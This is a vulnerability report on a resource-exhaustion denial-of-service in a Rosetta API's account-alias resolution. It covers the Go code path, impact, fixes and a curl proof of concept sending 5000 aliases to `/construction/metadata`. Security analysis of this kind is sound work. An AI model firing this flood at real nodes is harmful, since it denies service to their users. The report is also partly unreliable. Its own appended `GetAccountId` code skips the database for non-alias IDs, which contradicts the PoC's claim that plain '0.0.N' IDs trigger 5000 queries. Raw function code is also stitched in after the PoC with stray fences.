### Title
Unbounded Alias Count in `resolveAccountAliases()` Enables Sequential DB Query DoS

### Summary
The `resolveAccountAliases()` function in `rosetta/app/services/construction_service.go` iterates over a comma-separated `account_aliases` string supplied by any unauthenticated caller and issues one synchronous database query per alias with no upper bound on the alias count. An attacker can supply thousands of aliases in a single `/construction/metadata` request, exhausting the database connection pool and blocking request goroutines, degrading or denying service to all concurrent users of the Rosetta API.

### Finding Description
**Exact code path:**

`ConstructionMetadata` (line 159) calls `resolveAccountAliases(ctx, options)` unconditionally when `account_aliases` is present in the request options.

Inside `resolveAccountAliases` (lines 557–589):
```go
for accountAlias := range strings.SplitSeq(accountAliases, ",") {
    accountId, err := types.NewAccountIdFromString(accountAlias, c.systemShard, c.systemRealm)
    if err != nil {
        return emptyResult, errors.ErrInvalidAccount
    }
    found, rErr := c.accountRepo.GetAccountId(ctx, accountId)   // one DB query per alias
    if rErr != nil {
        return emptyResult, rErr
    }
    accountMap = append(accountMap, fmt.Sprintf("%s:%s", accountAlias, found))
}
```

Each iteration calls `GetAccountId` (persistence/account.go lines 138–159), which calls `ar.dbClient.GetDbWithContext(ctx)` and executes a raw SQL query against the `entity` table — one blocking round-trip per alias, sequentially.

**Root cause:** There is no check on `len(aliases)` or the byte length of `accountAliases` before entering the loop. The only guards are:
- `options[optionKeyAccountAliases] == nil` → early return (line 561)
- `IsOnline()` check (line 565)
- Type assertion to `string` (line 569)
- Per-alias format validation (line 576–579) — returns error on first invalid alias, but valid aliases proceed indefinitely

**Failed assumption:** The code assumes callers supply a small, bounded list of aliases (e.g., 2–5 accounts in a transaction). No such constraint is enforced.

### Impact Explanation
The database connection pool is capped at `maxOpenConnections: 100` (default). A single request with 100+ aliases that each resolve (or time out at `statementTimeout: 20s`) can hold a connection for up to 20 × N seconds sequentially. Multiple concurrent such requests exhaust the pool, causing all other Rosetta API database operations (block queries, account balance lookups) to queue or fail. This constitutes a denial-of-service against the entire Rosetta API service. The `/construction/metadata` endpoint requires no authentication, making this trivially reachable by any network-accessible client.

### Likelihood Explanation
The endpoint is unauthenticated and publicly documented as part of the Rosetta Construction API. No API key, session token, or privilege is required. The attack requires only a valid JSON POST body with a long comma-separated string in the `account_aliases` field. It is repeatable and can be automated. The Traefik middleware in the Helm chart (`inFlightReq: 5`, `rateLimit: average: 10`) provides partial mitigation only when deployed via that specific Helm chart configuration — it is not enforced at the application layer and is absent in bare deployments.

### Recommendation
1. **Enforce an alias count limit** at the start of `resolveAccountAliases()`:
   ```go
   const maxAccountAliases = 10
   aliases := strings.Split(accountAliases, ",")
   if len(aliases) > maxAccountAliases {
       return emptyResult, errors.ErrInvalidOptions
   }
   ```
2. **Enforce a byte-length limit** on the raw `accountAliases` string before splitting.
3. **Batch the DB lookups** using an `IN` clause rather than N sequential queries.
4. **Apply application-level rate limiting** independent of infrastructure configuration.

### Proof of Concept
```bash
# Generate 5000 valid-format aliases (0.0.1 through 0.0.5000)
ALIASES=$(python3 -c "print(','.join(f'0.0.{i}' for i in range(1,5001)))")

# POST to /construction/metadata on an online Rosetta node
curl -s -X POST http://<rosetta-host>/construction/metadata \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"mainnet\"},
    \"options\": {
      \"operation_type\": \"CRYPTO_TRANSFER\",
      \"account_aliases\": \"$ALIASES\"
    }
  }"
```

This triggers 5000 sequential `SELECT` queries against the `entity` table within a single request goroutine. Sending this request concurrently from multiple clients exhausts the DB connection pool (`maxOpenConnections: 100`) and blocks all other database-dependent Rosetta endpoints. func (c *constructionAPIService) resolveAccountAliases(
	ctx context.Context,
	options map[string]any,
) (emptyResult string, nilErr *rTypes.Error) {
	if options[optionKeyAccountAliases] == nil {
		return
	}

	if !c.BaseService.IsOnline() {
		return emptyResult, errors.ErrEndpointNotSupportedInOfflineMode
	}

	accountAliases, ok := options[optionKeyAccountAliases].(string)
	if !ok {
		return emptyResult, errors.ErrInvalidOptions
	}

	var accountMap []string
	for accountAlias := range strings.SplitSeq(accountAliases, ",") {
		accountId, err := types.NewAccountIdFromString(accountAlias, c.systemShard, c.systemRealm)
		if err != nil {
			return emptyResult, errors.ErrInvalidAccount
		}

		found, rErr := c.accountRepo.GetAccountId(ctx, accountId)
		if rErr != nil {
			return emptyResult, rErr
		}
		accountMap = append(accountMap, fmt.Sprintf("%s:%s", accountAlias, found))
	}

	return strings.Join(accountMap, ","), nilErr
}
```

func (ar *accountRepository) GetAccountId(ctx context.Context, accountId types.AccountId) (
	zero types.AccountId,
	_ *rTypes.Error,
) {
	if !accountId.HasAlias() {
		return accountId, nil
	}

	db, cancel := ar.dbClient.GetDbWithContext(ctx)
	defer cancel()

	var entity domain.Entity
	if err := db.Raw(selectCurrentCryptoEntityByAlias, sql.Named("alias", accountId.GetAlias())).First(&entity).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return zero, hErrors.ErrAccountNotFound
		}

		return zero, hErrors.ErrDatabaseError
	}

	return types.NewAccountIdFromEntityId(entity.Id), nil
}
```
